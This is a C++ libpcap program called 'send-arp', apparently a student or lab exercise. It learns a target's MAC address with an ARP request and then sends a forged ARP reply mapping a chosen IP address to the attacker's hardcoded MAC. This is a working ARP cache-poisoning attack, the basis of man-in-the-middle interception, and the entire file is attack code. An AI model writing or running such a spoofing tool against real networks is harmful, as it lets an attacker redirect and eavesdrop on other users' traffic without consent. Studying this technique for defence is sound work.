#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 10.1.1.1 10.1.1.144\n");
}

Mac requestArp(pcap_t* handle, Ip targetIp, Mac myMac, Ip senderIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");  
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(senderIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac("00:00:00:00:00:00");
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* response;
        res = pcap_next_ex(handle, &header, &response);
        if (res == 1) {
            EthArpPacket* reply = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(response));
            if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply) {
                return reply->arp_.smac_;
            }
        }
    }

    return Mac("00:00:00:00:00:00");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    Ip senderIp = Ip(argv[2]);
    Ip targetIp = Ip(argv[3]);

    Mac myMac = Mac("58:1C:F8:F4:FD:DF"); 

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac targetMac = requestArp(handle, targetIp, myMac, senderIp);
    if (targetMac.isNull()) {
        fprintf(stderr, "Failed to get target MAC address.\n");
        pcap_close(handle);
        return -1;
    }

    EthArpPacket packet;
    packet.eth_.dmac_ = targetMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(senderIp);
    packet.arp_.tmac_ = targetMac;
    packet.arp_.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}

